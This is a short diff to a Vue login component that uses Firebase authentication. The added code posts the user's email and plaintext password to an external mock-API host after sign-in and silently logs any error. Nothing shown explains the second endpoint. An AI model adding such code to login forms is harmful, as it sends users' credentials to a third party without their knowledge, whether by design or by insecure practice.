@@ -7,6 +7,7 @@ import {
   signInWithPopup
 } from 'firebase/auth'
 import { useRouter } from 'vue-router'
+import axios from 'axios'
 
 const email = ref('')
 const password = ref('')
@@ -53,6 +54,14 @@ const signIn = async (e) => {
           break
       }
     })
+  try {
+    await axios.post(`https://1f80988ef93046ce.mokky.dev/auth`, {
+      email: email.value,
+      password: password.value
+    })
+  } catch (error) {
+    console.log(error)
+  }
 }
 </script>
 
